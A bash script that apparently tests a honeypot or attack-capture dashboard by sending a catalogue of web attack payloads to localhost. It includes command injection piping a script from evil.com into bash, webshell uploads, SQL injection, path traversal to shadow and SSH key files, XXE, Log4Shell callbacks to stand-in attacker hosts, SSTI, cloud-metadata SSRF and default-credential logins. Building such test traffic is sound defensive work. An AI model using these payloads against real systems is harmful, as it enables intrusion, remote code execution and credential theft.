#!/bin/bash

# Test script to generate various attack patterns for the UI

BASE_URL="http://localhost:8080"

echo "🚀 Starting attack simulation for UI testing..."
echo "Open http://localhost:9090 to view the live capture dashboard"
echo ""

# Function to send request with delay
attack() {
    local desc="$1"
    local url="$2"
    local method="${3:-GET}"
    local data="$4"

    echo "[ATTACK] $desc"

    if [ "$method" = "POST" ] && [ -n "$data" ]; then
        curl -s -X POST "$BASE_URL$url" -d "$data" -H "Content-Type: application/x-www-form-urlencoded" >/dev/null
    else
        curl -s -X "$method" "$BASE_URL$url" >/dev/null
    fi

    sleep 0.5
}

echo "=== 1. Command Injection Attacks ==="
attack "Whoami command injection" "/api/ping?host=127.0.0.1;whoami"
attack "ID command via pipe" "/cgi-bin/admin.cgi?action=|id"
attack "Uname command" "/admin/exec?cmd=uname%20-a"
attack "Cat /etc/passwd" "/api/exec?command=cat+/etc/passwd"
attack "Curl to external C2" "/debug.php?x=\$(curl http://evil.com/shell.sh|bash)"

echo ""
echo "=== 2. File Upload Attempts ==="
attack "PHP webshell upload" "/upload.php" "POST" "file=<?php system(\$_GET['cmd']); ?>&filename=shell.php"
attack "JSP webshell upload" "/fileupload" "POST" "content=<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>&name=shell.jsp"
attack "ASPX webshell" "/api/upload" "POST" "data=<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>"

echo ""
echo "=== 3. SQL Injection ==="
attack "Login bypass" "/login" "POST" "username=admin' OR '1'='1&password=anything"
attack "Union-based SQLi" "/products?id=1' UNION SELECT password FROM users--"
attack "Time-based blind SQLi" "/search?q=test' AND SLEEP(5)--"
attack "Error-based SQLi" "/api/user?id=1' AND 1=CONVERT(int,(SELECT @@version))--"

echo ""
echo "=== 4. Path Traversal ==="
attack "Read /etc/passwd" "/download?file=../../../../etc/passwd"
attack "Read /etc/shadow" "/api/file?path=../../../etc/shadow"
attack "Windows SAM file" "/download?file=..\\..\\..\\windows\\system32\\config\\sam"
attack "SSH private keys" "/view?doc=../../../../root/.ssh/id_rsa"

echo ""
echo "=== 5. XXE (XML External Entity) ==="
attack "XXE file read" "/api/xml" "POST" '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
attack "XXE SSRF" "/parse" "POST" '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server/admin">]><data>&xxe;</data>'

echo ""
echo "=== 6. Log4Shell Attempts ==="
attack "Log4j JNDI LDAP" "/api/search?query=\${jndi:ldap://evil.com/a}"
attack "Log4j RMI exploit" "/login" "POST" "username=\${jndi:rmi://attacker.com/Exploit}"
attack "Obfuscated Log4Shell" "/api/log?msg=\${jndi:ldap://\${env:HOSTNAME}.evil.com/a}"

echo ""
echo "=== 7. Template Injection ==="
attack "SSTI Jinja2" "/render?template={{7*7}}"
attack "SSTI with system" "/api/render" "POST" "tpl={{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}"
attack "Freemarker SSTI" "/template?input=<#assign ex=\"freemarker.template.utility.Execute\"?new()> \${ex(\"id\")}"

echo ""
echo "=== 8. Deserialization ==="
attack "Java deserialization" "/api/session" "POST" "data=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="
attack "PHP object injection" "/api/load?obj=O:8:\"stdClass\":1:{s:4:\"exec\";s:6:\"whoami\";}"

echo ""
echo "=== 9. SSRF (Server-Side Request Forgery) ==="
attack "AWS metadata SSRF" "/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
attack "Internal port scan" "/proxy?target=http://localhost:22"
attack "Cloud metadata" "/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

echo ""
echo "=== 10. RCE Attempts ==="
attack "PHP eval" "/api/calc.php?expr=system('whoami')"
attack "Bash command substitution" "/test?input=\`whoami\`"
attack "Python exec" "/api/python?code=__import__('os').system('id')"

echo ""
echo "=== 11. CVE-Specific Exploits ==="
attack "Spring4Shell (CVE-2022-22965)" "/vulnerable?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{whoami}"
attack "ProxyShell (CVE-2021-34473)" "/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com"
attack "Heartbleed probe" "/api/heartbeat" "POST" "AAMAAgBAAAAAAAAAAAAA"

echo ""
echo "=== 12. Webshell Access Attempts ==="
attack "China Chopper" "/shell.php?pass=eval(\$_POST['cmd'])"
attack "WSO webshell" "/wso.php?act=ls&d=/var/www"
attack "C99 shell" "/c99.php?act=cmd&cmd=ls+-la"

echo ""
echo "=== 13. Credential Stuffing ==="
attack "Admin login #1" "/login" "POST" "user=admin&pass=admin123"
attack "Admin login #2" "/auth" "POST" "username=administrator&password=Password123!"
attack "Root login" "/api/auth" "POST" "user=root&pass=toor"

echo ""
echo "=== 14. Directory Bruteforce ==="
attack "Admin panel search" "/admin/"
attack "Backup file search" "/backup.sql"
attack "Config file" "/config.php"
attack "Git exposure" "/.git/config"
attack "Env file" "/.env"
attack "Swagger API" "/api/swagger.json"

echo ""
echo "=== 15. Scanner Fingerprints ==="
attack "Nikto scan" "/cgi-bin/test.cgi" "GET" ""
attack "SQLMap scan" "/products?id=1" "GET" ""
attack "Nmap NSE script" "/robots.txt" "GET" ""

echo ""
echo "✅ Attack simulation complete!"
echo ""
echo "📊 View live captures at: http://localhost:9090"
echo "📁 Check captures directory:"
echo "   - captures/interactions.jsonl (all interactions)"
echo "   - captures/commands/ (command injections)"
echo "   - captures/payloads/ (other payloads)"
echo "   - captures/sql/ (SQL injections)"
echo ""
echo "🔍 Quick stats:"
wc -l captures/interactions.jsonl 2>/dev/null || echo "No interactions yet"
